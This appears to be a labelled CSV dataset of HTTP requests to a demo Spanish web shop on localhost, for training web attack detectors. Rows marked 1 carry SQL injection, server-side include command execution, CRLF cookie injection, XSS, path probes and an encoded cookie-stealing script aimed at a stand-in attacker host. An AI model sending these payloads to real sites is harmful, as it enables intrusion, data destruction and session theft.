URL,Target
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gaye&password=kanTiaNa&nombre=Fructuoso&apellidos=Rodrigo+Ambr%F3s&emailA=bloom%40ajuntamentbcn2-0.sz&dni=96068417Q&direccion=C%2F+Juan+Sebastian+Elcano+178+&ciudad=Tob%EDa&cp=17741&provincia=Lleida&ntc=5250839743016206&B1=Registrar,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=c%2F%3Fa%2Cry&pwd=0ara7s5o&remember=on&B1=Entrar,1
http://localhost:8080/tienda1/publico/productos.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ebony&pwd=manferidor&remember=off&B1=Entrar,0
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ellacott2&password=4o4D3NERO&nombre=Soraya&apellidos=Neira+Umbert&email=franks.merayo%40karldeux.ki&dni=22115972T&direccion=Capmany%2C+94+4%3FE&ciudad=Tresjuncos&cp=13600&provincia=C%E1diz&ntc=0582956368100582&B1=Registrar,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/publico/miembros.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kristel&password=d2s7Sp79ro&nombre=Reiji&apellidos=Estolano+Boget&email=spiegel-haake%40convention.no&dni=62145911A&direccion=Travesia+Barrionuevo%2C+49+&ciudad=Turcia&cp=32170&provincia=Huesca&ntc=7738690201675696&B1=Registrar,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=detleff3&pwd=tes6a485n&remember=on&B1=Entrar,0
http://localhost:8080/tienda1/miembros/fotos.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=alvarez&pwd=9ec828%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&remember=on&B1=Entrar,1
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/publico/carrito.jsp/6909030637832563290.jsp.old,1
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8041&B1=Pasar+por+caja%2F,1
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp/.OLD,1
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/miembros/salir.jsp/asf-logo-wide.gif/.bak,1
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/publico/miembros.jsp/asf-logo-wide.gif,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precioA=100&cantidad=41&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&B1=Pasar+por+caja,1
http://localhost:8080/tienda1/global/creditos.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/miembros/index.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidad=67&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lupien&pwd=0ap7r344c6&remember=on&B1=Entrar,0
http://localhost:8080/tienda1/global/creditos.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/imagenes/asf-logo-wide.gif.OLD,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gittins&password=36lis8r&nombre=Katia&apellidos=Luque&email=clay%40parcalia.ml&dni=92152955M&direccion=Font+D%27en+Canyelles+21%2C+1-B&ciudad=Montseny&cp=02215&provincia=Toledo&ntc=8096640532589515&B1=Registrar,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,1
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/publico/miembros.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100&cantidad=67&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9111&B1=Confirmar%2F,1
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0
http://localhost:8080/CFIDE/administrator/header.cfm,1
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/scripts/tools/drvrs.exe,1
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg/6909030637832563290.jsp,1
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9800&B1A=Confirmar,1
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/autenticar.jsp,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tarle&password=8ar0enaDor&nombre=Romildo&apellidos=Decaralt+Melero&email=nye%40intg.ws&dni=92321751G&direccion=Pl.+De+La+Muralla+Liberal+169+2%3FB&ciudadA=Almensilla&cp=47513&provincia=Girona&ntc=9922927157537340&B1=Registrar,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1,1
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/miembros/fotos.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=margalo&pwd=diSTilAtorIO&remember=off&B1=Entrar,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9853&B1=Pasar+por+caja%2F,1
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/IISSamples/sdk/asp/database/LimitRows_VBScript.asp,1
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bnrecad&passwordA=iN%21solUBLe&nombre=Aurelio&apellidos=Ospina+Soma&email=humbert%4024htranslations.name&dni=78151636M&direccion=Ramat%2C+145+5%3FB&ciudad=Barbastro&cp=31227&provincia=Valladolid&ntc=5175468282615613&B1=Registrar,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ehrenfri&password=4l6AD1E14&nombre=Ail%E9n&apellidos=Amaro&email=antone1%40tiendasyofertas.ve&dni=97233442E&direccion=C%2F+Artazuri%F1a%2C+43+10%3FE&ciudad=Talarrubias&cp=03400&provincia=Granada&ntc=8954375699794509&B1=Registrar,0
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/publico/miembros.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=goldstei&pwd=exp8a1%21a6a&remember=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&B1=Entrar,1
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=pennie&pwd=s353icia41838e&remember=on&B1=Entrar,0
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro%27INJECTED_PARAM&login=benny&password=0REn3Ga6&nombre=Eudosio&apellidos=Miguez+Chew&email=doyle-murray%40ajuntamentbarcelona2-0.hn&dni=76229865E&direccion=Travesia+1+De+Los+Laureles%2C+144%2C+&ciudad=Sant+Cugat+Sesgarrigues&cp=28300&provincia=Burgos&ntc=9519490312798235&B1=Registrar,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100&cantidad=16&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=aeriel&password=ajuagas&nombre=Denel&apellidos=R%EDos+Rius&email=gift%40distritoeste.no&dni=77731441C&direccion=Poligono+Galiana+114+&ciudad=Nu%F1o+G%F3mez&cp=50259&provincia=Zamora&ntc=5636450120440789&B1=Registrar,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=84&B1A=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=84&B1=Pasar+por+caja,0
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4486&B1=Pasar+por+caja%257C,1
http://localhost:8080/tienda1/6909030637832563290.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=cluett&password=43la5a&nombre=Sandro&apellidos=Maulen&email=orschel%40zoorapia.ly&dni=19848007L&direccion=C%2F+Agrupacion+Este%2C+68+5%3FE&ciudadA=Gernika-Lumo&cp=42141&provincia=Granada&ntc=5560830050688331&B1=Registrar,1
http://localhost:8080/tienda1/global/asf-logo-wide.gif,1
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/miembros/fotos.jsp,0
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/publico/miembros.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hlinka&password=soez&nombre=Jordi&apellidos=Cristaldo+Marchan&email=dubarry%40soyrojo.tr&dni=21392437E&direccion=Bloc+Sant+Simo+93+&ciudad=Miravete+de+la+Sierra&cp=50562&provincia=Teruel&ntc=2569848242222580&B1=Registrar,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,0
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/asf-logo-wide.gif/.java,1
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tranfagl&password=23l8noi7e&nombre=Veneranda&apellidos=B%E1ez+Clua&email=gretler-rinell%40magadan.com.yu&dni=38888523P&direccion=Lugar+Grela+152+1%3FF&ciudad=Terrateig&cp=19185&provincia=Albacete&ntc=0269447503610316&B1=Registrar,0
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/WebSphereSamples/,1
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=nady&password=9va3831&nombre=Shirley&apellidos=Urbaez+Mariangel&email=erlich-jarrel%40modeloscaninos.ni&dni=39759775C&direccion=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&ciudad=Navalonguilla&cp=50268&provincia=Segovia&ntc=5083698855321760&B1=Registrar,1
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/global/titulo.jsp/6909030637832563290.jsp,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=sirevici&password=di0cut6dor7&nombre=Anan%EDas&apellidos=Jener+Monaj&email=wahl%4021horas.iq&dni=90230020P&direccion=Los+Polancos+133+&ciudad=Pintanos%2C+Los&cp=45256&provincia=Lleida&ntc=6034871098442134&B1=Registrar,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9054&B1=Confirmar,0
http://localhost:8080/asf-logo-wide.gif.old,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7576&B1=Pasar+por+caja,0
http://localhost:8080/CFIDE/administrator/welcome.cfm,1
http://localhost:8080/tienda1/miembros/index.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kaefer&password=cOrreNT%CDA&nombre=Yahed&apellidos=Moux+Claver&email=bradshaw.ocallaghan%40almascanarias.do&dni=05208723M&direccion=Calle+Puerta+Del+Sol%2C+88%2C+&ciudad=Villamanrique+de+la+Condesa&cp=47800&provincia=Valencia&ntc=6196716655513010&B1=Registrar,0
http://localhost:8080/tienda1/imagenes/2.gif/asf-logo-wide.gif/,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39&cantidad=31&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mcfarlan&password=bat3an&nombre=Odil%F3n&apellidos=Bassaga%F1a+Gifra&email=dannunzio.sugiura%40ilusionarium.sj&dni=14835707V&direccion=Entrada+Casas+90+&ciudad=Pelayos&cp=25265&provincia=Huesca&ntc=9431159156347522&B1=Registrar,0
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=typer0&password=fo9nece9&nombre=Celia&apellidos=De+Cabez%F3n+Raiz%E1bal&email=trainor_chadwick%40librodeapuntes.mz&dni=12269719R&direccion=C%2F+Barranc+De+Jonqueres%2C+186%2C+&ciudad=Zas&cp=49618&provincia=%C1lava&ntc=7265260392335726&B1=Registrar,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ivanyi0&password=va7e9ianato&nombre=Ve*%2Cr%2Bna&apellidos=Echevarr%EDa+Borras&email=tadio.bixby%40espaciopintor.eh&dni=98763423C&direccion=Torrent+De+Can+Quintana%2C+179%2C+&ciudad=Llocnou+de+la+Corona&cp=49430&provincia=Lleida&ntc=8110791105529474&B1=Registrar,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=346&B1=Pasar+por+caja,1
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=bouchard&pwd=6h11a3rud9&remember=off&B1=Entrar,0
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=49&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=73&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precioA=85&cantidad=83&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6851&B1=Confirmar%2B,1
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/asf-logo-wide.gif/,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=beaumont&password=S9lEva398D59&nombre=Rudy&apellidos=Auladell+Quint%E1s&email=garrick-overton%40corjet.gd&dni=15467411A&direccion=C%2F+Quasimodo+95+13%3FE&ciudad=Arbanc%F3n&cp=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&provincia=Zamora&ntc=7990892411881647&B1=Registrar,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=623&B1A=Pasar+por+caja,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=bonny&password=*sepultura&nombre=Ives&apellidos=Raurell&email=persky-scavran%40mystyleperfume.co&dni=92230868V&direccion=Pomponio+Mela+190%2C+11F&ciudad=%27OR%27a%3D%27a&cp=37488&provincia=Santa+Cruz+de+Tenerife&ntc=5805853159182957&B1=Registrar,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carritosessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,1
